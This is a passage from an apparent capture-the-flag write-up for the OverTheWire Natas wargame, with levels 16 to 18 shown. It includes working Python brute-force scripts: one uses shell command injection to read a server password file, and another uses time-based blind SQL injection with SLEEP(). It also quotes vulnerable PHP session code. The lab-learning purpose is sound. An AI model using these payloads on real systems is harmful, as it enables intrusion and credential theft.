                &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;URL1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;URL2&lt;/span&gt;  &lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;bananas&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                        &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Password so far: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                        &lt;span class="k"&gt;break&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="c"&gt;# authorization: login and password&lt;/span&gt;
        &lt;span class="n"&gt;AUTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;natas16&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;****************************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="c"&gt;# BASE64 password and 32 bytes&lt;/span&gt;
        &lt;span class="n"&gt;CHARS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ascii_letters&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;digits&lt;/span&gt;
        &lt;span class="n"&gt;LENGTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;32&lt;/span&gt;

        &lt;span class="c"&gt;# crafted url&lt;/span&gt;
        &lt;span class="n"&gt;URL1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://natas16.natas.labs.overthewire.org?needle=$(grep -E ^&amp;#39;&lt;/span&gt;
        &lt;span class="n"&gt;URL2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;.* /etc/natas_webpass/natas17)banana&amp;amp;submit=Search&amp;#39;&lt;/span&gt;

        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;URL1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;URL2&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Around 10 minutes later we get our password.&lt;/p&gt;
&lt;h3&gt;Level 17: SQL Injection III&lt;/h3&gt;
&lt;p&gt;This level starts with a username search similar from the 14th and 15th levels:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cm"&gt;/*&lt;/span&gt;
&lt;span class="cm"&gt;CREATE TABLE `users` (&lt;/span&gt;
&lt;span class="cm"&gt;  `username` varchar(64) DEFAULT NULL,&lt;/span&gt;
&lt;span class="cm"&gt;  `password` varchar(64) DEFAULT NULL&lt;/span&gt;
&lt;span class="cm"&gt;);&lt;/span&gt;
&lt;span class="cm"&gt;*/&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$link&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;mysql_connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;natas17&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;censored&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;mysql_select_db&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;natas17&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$link&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SELECT * from users where username=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nx"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;.&amp;quot;\&amp;quot;&amp;quot;;
    if(array_key_exists(&amp;quot;debug&amp;quot;, $_GET)) {
        echo &amp;quot;Executing query: $query&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
    }
    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) &amp;gt; 0) {
        //echo &amp;quot;This user exists.&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
    } else {
        //echo &amp;quot;This user doesn&amp;#39;t exist.&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
    }
    } else {
        //echo &amp;quot;Error in query.&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
    }
    mysql_close($link);
} else {
?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The difference now is that the echo commands are commented off. We can't use the same method as before to check whether we got a right char in the password.&lt;/p&gt;
&lt;p&gt;What other ways we can have binary indicator?&lt;/p&gt;
&lt;p&gt;We can play with time!&lt;/p&gt;
&lt;h4&gt;Stating the Attack:&lt;/h4&gt;
&lt;p&gt;Luckily, MySQL has a query &lt;a href="http://dev.mysql.com/doc/refman/5.0/en/miscellaneous-functions.html#function_sleep"&gt;sleep()&lt;/a&gt; that delays the next command for a number of seconds. We can use this as an inject command in the end of our former exploits:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;SUBSTRING&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="n"&gt;LIKE&lt;/span&gt; &lt;span class="n"&gt;BINARY&lt;/span&gt; &lt;span class="n"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;SLEEP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;AND&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Notice that since SLEEP() does not carry a &lt;strong&gt;"&lt;/strong&gt; we use the &lt;em&gt;always true&lt;/em&gt; clause to close the &lt;strong&gt;"&lt;/strong&gt; added by the server.&lt;/p&gt;
&lt;p&gt;A crafted URL should look like this:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://natas15.natas.labs.overthewire.org/?username=natas16%22%20AND%20SUBSTRING(password,1,1)%20LIKE%20BINARY%20%22d%22%20AND%20SLEEP(320)%20AND%20%221%22=%221&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4&gt;Crafting the Attack:&lt;/h4&gt;
&lt;p&gt;The new script is:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SQL_URL1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SQL_URL2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
                &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;SQL_URL1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;SQL_URL2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;SQL_URL3&lt;/span&gt; &lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="n"&gt;time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;elapsed&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;total_seconds&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
                &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Position &lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s"&gt;: trying &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;... Time: &lt;/span&gt;&lt;span class="si"&gt;%.3f&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
                &lt;span class="c"&gt;#print r.url&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Password so far: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                    &lt;span class="k"&gt;break&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="c"&gt;# authorization: login and password&lt;/span&gt;
        &lt;span class="n"&gt;AUTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;natas17&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;****************************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="c"&gt;# BASE64 password and 32 bytes&lt;/span&gt;
        &lt;span class="n"&gt;CHARS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ascii_letters&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;digits&lt;/span&gt;
        &lt;span class="n"&gt;LENGTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;32&lt;/span&gt;

        &lt;span class="c"&gt;# crafted url&lt;/span&gt;
        &lt;span class="n"&gt;SQL_URL1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://natas17.natas.labs.overthewire.org?username=natas18&amp;quot; AND SUBSTRING(password,&amp;#39;&lt;/span&gt;
        &lt;span class="n"&gt;SQL_URL2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;,1) LIKE BINARY &amp;quot;&amp;#39;&lt;/span&gt;
        &lt;span class="n"&gt;SQL_URL3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;quot; AND SLEEP(10) AND &amp;quot;1&amp;quot;=&amp;quot;1&amp;#39;&lt;/span&gt;

        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SQL_URL1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SQL_URL2&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Around 15 minutes later I got the password.&lt;/p&gt;
&lt;h3&gt;Level 18: Hijacking Session ID&lt;/h3&gt;
&lt;p&gt;The 18th level starts with a login form, just like the levels before it. The source code is much more intricate though.&lt;/p&gt;
&lt;p&gt;First, we see the declaration of the size of the id. This is important if we want to brute force the solution:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;maxid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;640&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// 640 should be enough for everyone&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then we have a function that checks whether a variable &lt;em&gt;$id&lt;/em&gt; is a number with the PHP function &lt;a href="http://php.net/manual/en/function.is-numeric.php"&gt;is_numeric&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;isValidID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="cm"&gt;/* {{{ */&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;is_numeric&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$id&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then we have this main object:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;showform&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;true&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;if&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;my_session_start&lt;/span&gt;&lt;span class="o"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;print_credentials&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;showform&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="nt"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_REQUEST&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_REQUEST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;createID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_REQUEST&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="n"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_SESSION&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;isValidAdminLogin&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;New session started&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;showform&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;print_credentials&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nt"&gt;if&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;showform&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="o"&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The next function create an random id number with the value defined by &lt;em&gt;$maxid&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="x"&gt;function createID($user) { /* {{{ */&lt;/span&gt;
&lt;span class="x"&gt;    global $maxid;&lt;/span&gt;
&lt;span class="x"&gt;    return rand(1, $maxid);&lt;/span&gt;
&lt;span class="x"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This checks whether the function &lt;em&gt;my_session_start()&lt;/em&gt; is true:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;my_session_start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="cm"&gt;/* {{{ */&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PHPSESSID&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nx"&gt;and&lt;/span&gt; &lt;span class="nx"&gt;isValidID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$_COOKIE&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PHPSESSID&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;debug&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Session start failed&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;debug&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Session start ok&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;debug&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Session was old: admin flag set&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
